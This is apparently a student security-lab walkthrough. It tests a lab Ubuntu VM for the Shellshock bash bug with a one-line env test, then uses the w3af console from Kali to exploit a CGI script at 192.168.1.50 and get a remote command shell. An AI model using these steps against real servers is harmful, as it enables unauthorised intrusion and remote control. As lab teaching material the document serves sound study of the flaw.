First,  logged into SecOnion Virtual and checked the status of nsm service from the Terminal Emulator.
	
	soadmin@Security-Onion:~$ sudo service nsm status

If nsm status reports back with all modules as OK, proceed to the next step. If not, then initiate the service nsm start/restart command.

Then logged into Ubuntu virtual machine and run the vulnerability check on the bash configuration. Some CVE vulnerabilities will be detected. 

	student@Ubuntu:/home/scripts$ ./shellshock_test.sh
	
	shellshock_test.sh checks the vulnerability on the current bash configuration. Each of the vulnerabilities can be diagnosed by entering bash commands into the
terminal. Test out the CVE-2014-6271 vulnerability manually. Type the command below followed by pressing Enter

	student@Ubuntu:/home/scripts$ env x=’() { :;}; echo vulnerable’ bash –c “echo cve-2014-6271”
	
If you get the output as cve-2014-6271 then your system us most likely  vulnerable to shellshock.
------------------------------

Exploit the Shellshock Vulnerability using w3af

From Kali virtual machine, we verified Ubuntu virtual machine (192.168.1.50) server is running and CGI script is enabled on the web server. For this purpose,
Launch the Kali virtual machine, and open Iceweasel browser. Test to see if CGI is enabled on the web server of Ubuntu VM. Type the following into the address bar:

	http://192.168.1.50/cgi-bin/bashexample
	
In Kali Termina, verify "ifconfig" the loopback network interface to an up state, if it is not then entering the command below.

	root@Kali-Attacker:~# ifconfig lo up
	
Change the diretory to  /opt/w3af directory then, initialize the w3af console application to exploit the CVE-2014-6271 vulnerability against the cgi-bin
running on the Ubuntu’s Apache web server.

	root@Kali-Attacker:/opt/w3af# ./w3af_console	NOTE: comand prompt change to w3af>>>.

Load a pluging model 
	w3af>>> plugins	NOTE: Comand prompt change to w3af/plugins>>>

Audit the shell_shock by typing the command below
	w3af/plugins>>> audit shell_shock

Go back and go to Target module
	w3af/plugins>>> back
	w3af>>> target	NOTE: Comand prompt change to w3af/config:target>>>

Set the target to http://192.168.1.50/cgibin/bashexample
	w3af/config:target>>> set target http://192.168.1.50/cgi-bin/bashexample

Then go back to main w3af>>> using back comand and start the vulnerability detection using start comand.
	w3af/config:target>>> back
	w3af>>> start

After fininsing the scan, we will notice  a vulnerability was found. Now we can load exploit module and start exploit (os_commanding exploit). 
	w3af>>> exploit
	w3af/exploit>>> exploit os_commanding

The vulnerability will be successfully ecploited. We can start an interaction with shell ID of 0 by the command below 
	w3af/exploit>>> interact 0 		NOTE: the prompt will change to w3af/exploit/os_commanding-0>>>
	
	Now, you will have shell level access of Victim machine. You can do what ever you want from here. 

	
	
